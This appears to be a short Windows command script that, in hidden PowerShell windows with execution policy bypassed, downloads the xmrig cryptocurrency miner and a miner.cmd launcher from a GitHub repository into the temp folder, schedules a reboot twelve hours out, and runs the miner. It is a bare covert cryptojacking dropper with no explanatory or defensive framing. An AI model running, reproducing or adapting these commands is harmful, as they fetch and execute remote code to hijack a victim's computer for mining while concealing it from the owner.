cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/Intel/xmrig.exe
powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/Intel/miner.cmd
powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
